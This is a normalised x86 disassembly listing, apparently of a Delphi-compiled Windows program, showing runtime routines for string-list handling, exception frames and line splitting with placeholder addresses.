call sub_4031bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404220
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031bc
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414055
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_414074
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414109
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031bc
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404220
mov eax ebx
mov si 0xffff
call sub_403468
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414110
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
mov si 0xffff
call sub_403468
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403468
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40433c
sub_41411b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034c0
mov eax ebx
mov si 0xffff
call sub_403468
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403468
push eax
lea eax [ ebx + 0x4 ]
call sub_405628
mov ecx eax
mov edx r-xdata
pop eax
call sub_403320
sub_414166
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414198
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4141b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403320
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4141e0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414200
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41425a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413ab0
call sub_40326c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414268
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414dc0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_414298
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4142bc
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4142e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414387
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414430
xor eax eax
push ebp
push sub_41436a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414371
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414398
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413f84
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414430
xor eax eax
push ebp
push sub_414418
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
sub_414448
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414500
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4144a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414c58
mov eax [ ebp - 0x8 ]
push eax
push sub_414f08
push ebp
call sub_414448
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414500
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414595
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41459c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fe0
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4043c8
jne r-xdata
sub_4145ac
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4145a8
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
jmp sub_4039f8
sub_4145e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41462c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405aec
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4145ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414633
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_41463c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414714
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414430
xor eax eax
push ebp
push sub_4146f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146f9
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
sub_414730
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414775
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40447c
call sub_4086d8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41477c
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_414784
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41488f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404054
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_4040ac
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414896
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fe0
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40427c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40427c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40427c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40427c
mov ebx eax
test ebx ebx
je r-xdata
sub_4148ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414924
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41492b
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414938
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4149fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4044dc
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_414f98
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041a4
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c078
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a02
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_414a0c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414a40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414a70
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415ad4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414abf
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_414ac4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414430
xor eax eax
push ebp
push sub_414b44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415620
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_4040ac
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b4b
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
sub_414b70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c18
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
call sub_414430
xor eax eax
push ebp
push sub_414bf4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
sub_414c20
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414c58
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414cfc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417810
mov eax [ ebp - 0x4 ]
call sub_414430
xor eax eax
push ebp
push sub_414cd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4168ac
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4184b0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cde
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
sub_414d08
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415ad4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414d53
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d5a
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_414d60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414dad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40427c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414db4
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_414dc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405640
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_414df4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414e37
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4041b4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e3e
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_414e44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ef8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414430
xor edx edx
push ebp
push sub_414edb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ee2
mov eax [ ebp - 0x4 ]
call sub_4144ec
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040ac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_414f08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414f7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41905c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_419064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f85
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419104
inc esi
dec ebx
jne r-xdata
sub_414fb0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_414fcc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414268
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a44
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_415034
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4145e4
jmp r-xdata
sub_4150d0
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a44
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415110
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
